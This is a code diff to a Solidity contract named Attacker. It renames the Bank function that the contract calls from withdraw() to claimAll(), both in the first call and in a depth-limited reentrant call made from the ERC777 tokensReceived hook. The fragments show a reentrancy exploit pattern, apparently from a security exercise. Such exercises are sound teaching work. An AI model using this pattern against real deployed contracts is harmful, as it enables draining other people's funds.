@@ -45,7 +45,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bank.deposit{value: amt}();
 
 		// Now call withdraw to trigger the first send of tokens, which will call tokensReceived
-		bank.withdraw();
+		bank.claimAll();
 	}
 
 	/*
@@ -72,7 +72,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 			if (depth < max_depth) {
 		depth++;
 		emit Recurse(depth);
-		bank.withdraw(); // reentrant call to Bank
+		bank.claimAll(); // reentrant call to Bank
 	}
 	}
 
